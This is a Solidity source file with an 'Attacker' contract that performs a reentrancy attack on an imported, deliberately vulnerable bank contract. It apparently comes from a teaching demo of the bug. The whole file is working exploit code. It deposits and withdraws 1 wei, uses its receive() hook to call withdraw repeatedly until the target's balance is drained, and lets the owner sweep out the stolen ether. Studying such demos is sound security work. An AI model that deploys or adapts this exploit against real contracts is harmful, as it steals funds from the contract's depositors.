// SPDX-License-Identifier: MIT
 pragma solidity ^0.8.24; 

import "./VelnerableBank.sol";

contract Attacker {
    VelnerableBank public vulnerable;
    address public owner;

    constructor(address vulnerableBank_) {
        vulnerable = VelnerableBank(vulnerableBank_);
        owner = msg.sender;
    }

    receive() external payable {
        if(address(vulnerable).balance > 1 wei) {
            vulnerable.withdraw(1 wei);
        }
    }

    function attack() public payable {
        require(msg.value > 1 wei, "need at least 1 wei to attack");

        // Deposit wei to velnerable contract
        vulnerable.deposit{value: 1 wei}();

        // withdraw the deposit wei triggering receive function
        vulnerable.withdraw(1 wei);
    }

    function withdraw() public {
        require(msg.sender == owner,"you are not the owner");
        payable(msg.sender).transfer(address(this).balance);
    }

    function getBalance() view public returns(uint256) {
        return address(this).balance;
    }
}